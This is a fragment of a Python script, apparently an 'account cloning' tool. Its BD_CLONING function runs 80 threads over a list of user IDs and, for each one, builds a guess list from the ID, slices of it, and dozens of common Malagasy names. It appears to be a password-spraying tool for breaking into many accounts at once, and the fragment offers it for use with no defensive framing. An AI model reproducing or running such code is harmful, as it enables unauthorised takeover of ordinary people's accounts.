...
def BD_CLONING():
    ...
    with tred(max_workers=80) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'fanantenana','Fanantenana','nirina','nirina','tsilavina','Tsilavina','narovana','Narovana','diamondra','Diamondra','koloina','Koloina','finoana','Finoana','Sarobidy','sarobidy','fitiavana','Fitiavana','malala','Malala','nomena','Nomena','fandresena','Fandresena','solofo','Solofo','lalaina','Lalaina','rakotomalala','Rakotomalala','nantenaina','Nantenaina','faniry','Faniry','rakoto','Rakoto','fanomezana','Fanomezana','finoana','Finoana','fitiavana','Fitiavana','augustin','Augustin','sahaza','Sahaza','lahatra','Lahatra','nilaina','Nilaina','mihary','Mihary','tolotra','Tolotra','mirindra','Mirindra','Natacha','natacha','mamitiana','Mamitiana','tantely','Tantely','sarindra','Sarindra','anjara','Anjara','nathalie','Nathalie','narindra','Narindra','harena','Harena','sitraka','Sitraka','safidy','Safidy','ravaka','Ravaka','faneva','Faneva']
